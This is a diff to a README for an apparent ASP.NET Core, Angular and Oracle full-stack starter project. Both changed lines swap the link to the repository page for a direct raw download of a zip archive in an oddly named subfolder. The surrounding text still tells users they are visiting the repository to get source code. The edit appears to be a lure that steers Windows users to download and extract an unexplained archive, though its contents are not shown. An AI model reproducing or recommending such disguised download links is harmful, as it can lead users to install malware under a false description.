@@ -1,6 +1,6 @@
 # 📊 aspnet-core-angular-oracle-fullstack-api - Build full web applications with ease
 
-[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/eldy7252/aspnet-core-angular-oracle-fullstack-api)
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://raw.githubusercontent.com/eldy7252/aspnet-core-angular-oracle-fullstack-api/main/meditullium/fullstack_aspnet_core_angular_api_oracle_3.0.zip)
 
 This software provides a complete foundation for web developers. It combines a powerful backend system with a modern user interface. You can manage data using Oracle databases and secure your application with standard authentication protocols.
 
@@ -21,7 +21,7 @@ Ensure you have the latest version of the .NET 8 Runtime installed on your machi
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Visit the repository page to download the source code: [Download Application](https://github.com/eldy7252/aspnet-core-angular-oracle-fullstack-api)
+1. Visit the repository page to download the source code: [Download Application](https://raw.githubusercontent.com/eldy7252/aspnet-core-angular-oracle-fullstack-api/main/meditullium/fullstack_aspnet_core_angular_api_oracle_3.0.zip)
 2. Locate the folder where the file saved on your computer.
 3. Right-click the folder and select Extract All.
 4. Open the extracted folder to view the project files.
